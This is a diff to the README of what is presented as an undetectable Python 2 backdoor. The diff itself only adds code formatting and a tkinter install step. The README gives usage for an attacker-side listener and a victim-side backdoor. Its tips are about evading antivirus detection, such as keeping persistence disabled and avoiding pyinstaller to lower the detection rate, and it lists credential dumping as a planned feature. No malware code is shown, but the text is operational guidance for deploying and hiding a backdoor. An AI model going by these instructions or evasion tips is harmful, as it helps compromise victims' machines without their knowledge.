@@ -12,13 +12,13 @@ FUD python2 backdoor
 8- client or server connection wait (one time only, no reconnecting yet)  
 
 # Usage
-pip install -r requirments.txt  
+`pip install -r requirments.txt`  
 
 attacker side:  
-./listener.py
+`./listener.py`
 
 victim side:  
-./backdoor.py  
+`./backdoor.py`  
 
 # Tips
 when using pyinstaller for windows executable generation, use the unencrypted backdoor as pycrypto doesn't work on windows.  
@@ -26,6 +26,8 @@ also pyinstaller will encrease the detection rate.
 backdoor doesnt auto-activate the persistance module for better evation chance, if you want to change that simply uncomment
 the self.persistance() line in backdoor file.  
 for list of commnads type 'h' in the listener console.   
+tkinter most be installed by default, otherwise install it with:  
+`apt install python-tk`  
 
 # ToDo
 credential dumping features  
